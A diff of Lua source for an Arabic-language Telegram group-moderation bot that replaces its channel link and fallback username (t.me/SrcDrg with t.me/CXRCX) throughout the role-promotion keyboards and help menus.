-keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId},{text="رفع ادمن",callback_data=data.sender_user_id_..":SetAdmin:"..AIANId}},{{text="رفع منشئ",callback_data=data.sender_user_id_..":SetConstructor:"..AIANId},{text="رفع مدير",callback_data=data.sender_user_id_..":SetManager:"..AIANId}},{{text="رفع منظف",callback_data=data.sender_user_id_..":SetCleaner:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId},{text="رفع ادمن",callback_data=data.sender_user_id_..":SetAdmin:"..AIANId}},{{text="رفع منشئ",callback_data=data.sender_user_id_..":SetConstructor:"..AIANId},{text="رفع مدير",callback_data=data.sender_user_id_..":SetManager:"..AIANId}},{{text="رفع منظف",callback_data=data.sender_user_id_..":SetCleaner:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif Constructor(data) then
-keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId},{text="رفع ادمن",callback_data=data.sender_user_id_..":SetAdmin:"..AIANId}},{{text="رفع منظف",callback_data=data.sender_user_id_..":SetCleaner:"..AIANId},{text="رفع مدير",callback_data=data.sender_user_id_..":SetManager:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId},{text="رفع ادمن",callback_data=data.sender_user_id_..":SetAdmin:"..AIANId}},{{text="رفع منظف",callback_data=data.sender_user_id_..":SetCleaner:"..AIANId},{text="رفع مدير",callback_data=data.sender_user_id_..":SetManager:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif Manager(data) then
-keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId},{text="رفع ادمن",callback_data=data.sender_user_id_..":SetAdmin:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId},{text="رفع ادمن",callback_data=data.sender_user_id_..":SetAdmin:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif Admin(data) then
-keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 end 
 https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end,nil)
@@ -1275,24 +1270,24 @@ if dp.first_name_ == false then
 Dev_AIAN(data.chat_id_, data.id_, 1, "⌯︙الحساب محذوف", 1, "md")
 return false  
 end
-local Text = ' ⌯︙قم باستعمال الازرار لتنزيل العضو ↫ ⤈\n⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n✓'
+local Text = ' ⌯︙قم باستعمال الازرار لتنزيل العضو ↫ ⤈\n⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n✓'
 keyboard = {} 
 if Sudo(data) then
-keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AIANId}},{{text="تنزيل منشئ",callback_data=data.sender_user_id_..":RemConstructor:"..AIANId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AIANId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AIANId},{text="تنزيل منشئ اساسي",callback_data=data.sender_user_id_..":RemBasicConstructor:"..AIANId}},{{text="تنزيل مالك",callback_data=data.sender_user_id_..":RemAIANConstructor:"..AIANId},{text="تنزيل مطور",callback_data=data.sender_user_id_..":RemSudoBot:"..AIANId}},{{text="تنزيل مطور ثانوي",callback_data=data.sender_user_id_..":RemSecondSudo:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AIANId}},{{text="تنزيل منشئ",callback_data=data.sender_user_id_..":RemConstructor:"..AIANId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AIANId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AIANId},{text="تنزيل منشئ اساسي",callback_data=data.sender_user_id_..":RemBasicConstructor:"..AIANId}},{{text="تنزيل مالك",callback_data=data.sender_user_id_..":RemAIANConstructor:"..AIANId},{text="تنزيل مطور",callback_data=data.sender_user_id_..":RemSudoBot:"..AIANId}},{{text="تنزيل مطور ثانوي",callback_data=data.sender_user_id_..":RemSecondSudo:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif SecondSudo(data) then
-keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AIANId}},{{text="تنزيل منشئ",callback_data=data.sender_user_id_..":RemConstructor:"..AIANId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AIANId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AIANId},{text="تنزيل منشئ اساسي",callback_data=data.sender_user_id_..":RemBasicConstructor:"..AIANId}},{{text="تنزيل مالك",callback_data=data.sender_user_id_..":RemAIANConstructor:"..AIANId},{text="تنزيل مطور",callback_data=data.sender_user_id_..":RemSudoBot:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AIANId}},{{text="تنزيل منشئ",callback_data=data.sender_user_id_..":RemConstructor:"..AIANId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AIANId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AIANId},{text="تنزيل منشئ اساسي",callback_data=data.sender_user_id_..":RemBasicConstructor:"..AIANId}},{{text="تنزيل مالك",callback_data=data.sender_user_id_..":RemAIANConstructor:"..AIANId},{text="تنزيل مطور",callback_data=data.sender_user_id_..":RemSudoBot:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif SudoBot(data) then
-keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AIANId}},{{text="تنزيل منشئ",callback_data=data.sender_user_id_..":RemConstructor:"..AIANId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AIANId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AIANId},{text="تنزيل منشئ اساسي",callback_data=data.sender_user_id_..":RemBasicConstructor:"..AIANId}},{{text="تنزيل مالك",callback_data=data.sender_user_id_..":RemAIANConstructor:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AIANId}},{{text="تنزيل منشئ",callback_data=data.sender_user_id_..":RemConstructor:"..AIANId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AIANId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AIANId},{text="تنزيل منشئ اساسي",callback_data=data.sender_user_id_..":RemBasicConstructor:"..AIANId}},{{text="تنزيل مالك",callback_data=data.sender_user_id_..":RemAIANConstructor:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif AIANConstructor(data) then
-keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AIANId}},{{text="تنزيل منشئ",callback_data=data.sender_user_id_..":RemConstructor:"..AIANId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AIANId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AIANId},{text="تنزيل منشئ اساسي",callback_data=data.sender_user_id_..":RemBasicConstructor:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AIANId}},{{text="تنزيل منشئ",callback_data=data.sender_user_id_..":RemConstructor:"..AIANId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AIANId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AIANId},{text="تنزيل منشئ اساسي",callback_data=data.sender_user_id_..":RemBasicConstructor:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif BasicConstructor(data) then
-keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AIANId}},{{text="تنزيل منشئ",callback_data=data.sender_user_id_..":RemConstructor:"..AIANId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AIANId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AIANId}},{{text="تنزيل منشئ",callback_data=data.sender_user_id_..":RemConstructor:"..AIANId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AIANId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif Constructor(data) then
-keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AIANId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AIANId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AIANId}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..AIANId},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif Manager(data) then
-keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif Admin(data) then
-keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 end 
 https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end,nil)
@@ -1347,7 +1342,7 @@ local Text = [[
 ⌯︙م5 ↫ اوامر المطورين
 ⌯︙م6 ↫ اوامر الاعضاء
 ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
-[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/SrcDrg)➤
+[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
 ]] 
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="• اوامر الادمنيه •",callback_data="/HelpList2:"..data.sender_user_id_},{text="• اوامر الحمايه •",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="• اوامر المنشئين •",callback_data="/HelpList4:"..data.sender_user_id_},{text="• اوامر المدراء •",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="• اوامر الاعضاء •",callback_data="/HelpList6:"..data.sender_user_id_},{text="• اوامر المطورين •",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}}}
@@ -1409,7 +1404,7 @@ local Text = [[
 ⌯︙البوتات بالطرد
 ⌯︙البوتات بالتقيد
 ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
-[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/SrcDrg)➤
+[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="• اوامر الادمنيه •",callback_data="/HelpList2:"..data.sender_user_id_}},{{text="• اوامر المنشئين •",callback_data="/HelpList4:"..data.sender_user_id_},{text="• اوامر المدراء •",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="• اوامر الاعضاء •",callback_data="/HelpList6:"..data.sender_user_id_},{text="• اوامر المطورين •",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -1479,7 +1474,7 @@ local Text = [[
 ⌯︙تقييد يوم + عدد الايام
 ⌯︙الغاء تقييد ↫ لالغاء التقييد بالوقت
 ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
-[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/SrcDrg)➤
+[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="• اوامر الحمايه •",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="• اوامر المنشئين •",callback_data="/HelpList4:"..data.sender_user_id_},{text="• اوامر المدراء •",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="• اوامر الاعضاء •",callback_data="/HelpList6:"..data.sender_user_id_},{text="• اوامر المطورين •",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -1538,7 +1533,7 @@ local Text = [[
 ⌯︙ردود المدير • ردود المطور • التحقق
 ⌯︙ضافني • حساب العمر • الزخرفه • غنيلي
 ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
-[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/SrcDrg)➤
+[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="• اوامر الادمنيه •",callback_data="/HelpList2:"..data.sender_user_id_},{text="• اوامر الحمايه •",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="• اوامر المنشئين •",callback_data="/HelpList4:"..data.sender_user_id_}},{{text="• اوامر الاعضاء •",callback_data="/HelpList6:"..data.sender_user_id_},{text="• اوامر المطورين •",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -1591,7 +1586,7 @@ local Text = [[
 ⌯︙المنشئين الاساسيين 
 ⌯︙حذف جميع الرتب
 ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
-[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/SrcDrg)➤
+[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="• اوامر الادمنيه •",callback_data="/HelpList2:"..data.sender_user_id_},{text="• اوامر الحمايه •",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="• اوامر المدراء •",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="• اوامر الاعضاء •",callback_data="/HelpList6:"..data.sender_user_id_},{text="• اوامر المطورين •",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -1671,7 +1666,7 @@ local Text = [[
 ⌯︙ترحيب البوت • المغادره
 ⌯︙البوت الخدمي • التواصل
 ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
-[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/SrcDrg)➤
+[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="• اوامر الادمنيه •",callback_data="/HelpList2:"..data.sender_user_id_},{text="• اوامر الحمايه •",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="• اوامر المنشئين •",callback_data="/HelpList4:"..data.sender_user_id_},{text="• اوامر المدراء •",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="• اوامر الاعضاء •",callback_data="/HelpList6:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -1713,7 +1708,7 @@ local Text = [[
 ⌯︙تحويل + بالرد ↫ صوره • ملصق • صوت • بصمه
 ⌯︙انطق + الكلام تدعم جميع اللغات مع الترجمه للعربي
 ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
-[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/SrcDrg)➤
+[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="• اوامر الادمنيه •",callback_data="/HelpList2:"..data.sender_user_id_},{text="• اوامر الحمايه •",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="• اوامر المنشئين •",callback_data="/HelpList4:"..data.sender_user_id_},{text="• اوامر المدراء •",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="• اوامر المطورين •",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -1910,19 +1905,19 @@ function by_reply(extra, result, success)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 local mrAIAN = DevAIAN:get(WAAD.."Comd:New:rt:AIAN:"..DEV_SoOoFi..msg.chat_id_)
 if mrAIAN == "مميز" and VipMem(msg) then
-Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'SrcDrg')..')'..' ❩\n⌯︙تم رفعه ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
+Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌯︙تم رفعه ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
 DevAIAN:set(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_SoOoFi) 
 DevAIAN:sadd(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.sender_user_id_)
 elseif mrAIAN == "ادمن" and Admin(msg) then 
-Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'SrcDrg')..')'..' ❩\n⌯︙تم رفعه ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
+Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌯︙تم رفعه ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
 DevAIAN:set(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_SoOoFi)
 DevAIAN:sadd(WAAD..'AIAN:Admins:'..msg.chat_id_, result.sender_user_id_)
 elseif mrAIAN == "مدير" and Manager(msg) then
-Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'SrcDrg')..')'..' ❩\n⌯︙تم رفعه ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
+Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌯︙تم رفعه ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
 DevAIAN:set(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_SoOoFi)  
 DevAIAN:sadd(WAAD..'AIAN:Managers:'..msg.chat_id_, result.sender_user_id_)
 elseif mrAIAN == "عضو" then
-Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'SrcDrg')..')'..' ❩\n⌯︙تم رفعه ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
+Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌯︙تم رفعه ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
 end
 end,nil)   
 end   
@@ -1936,19 +1931,19 @@ function by_reply(extra, result, success)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 local mrAIAN = DevAIAN:get(WAAD.."Comd:New:rt:AIAN:"..DEV_SoOoFi..msg.chat_id_)
 if mrAIAN == "مميز" and VipMem(msg) then
-Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'SrcDrg')..')'..' ❩\n⌯︙تم تنزيله ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
+Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌯︙تم تنزيله ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
 DevAIAN:srem(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.sender_user_id_)
 DevAIAN:del(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif mrAIAN == "ادمن" and Admin(msg) then 
-Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'SrcDrg')..')'..' ❩\n⌯︙تم تنزيله ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
+Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌯︙تم تنزيله ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
 DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_, result.sender_user_id_)
 DevAIAN:del(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif mrAIAN == "مدير" and Manager(msg) then
-Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'SrcDrg')..')'..' ❩\n⌯︙تم تنزيله ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
+Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌯︙تم تنزيله ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
 DevAIAN:srem(WAAD..'AIAN:Managers:'..msg.chat_id_, result.sender_user_id_)
 DevAIAN:del(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif mrAIAN == "عضو" then
-Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'SrcDrg')..')'..' ❩\n⌯︙تم تنزيله ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
+Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌯︙تم تنزيله ❨ '..DEV_SoOoFi..' ❩ بنجاح', 1, 'md')
 end
 end,nil)   
 end   
@@ -1962,19 +1957,19 @@ function py_username(extra, result, success)
 if result.id_ then
 local mrAIAN = DevAIAN:get(WAAD.."Comd:New:rt:AIAN:"..text1[2]..msg.chat_id_)
 if mrAIAN == "مميز" and VipMem(msg) then
-Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'SrcDrg')..')'..' ❩\n⌯︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
+Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌯︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 DevAIAN:sadd(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.id_)
 DevAIAN:set(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif mrAIAN == "ادمن" and Admin(msg) then 
-Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'SrcDrg')..')'..' ❩\n⌯︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
+Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌯︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 DevAIAN:sadd(WAAD..'AIAN:Admins:'..msg.chat_id_, result.id_)
 DevAIAN:set(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif mrAIAN == "مدير" and Manager(msg) then
-Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'SrcDrg')..')'..' ❩\n⌯︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
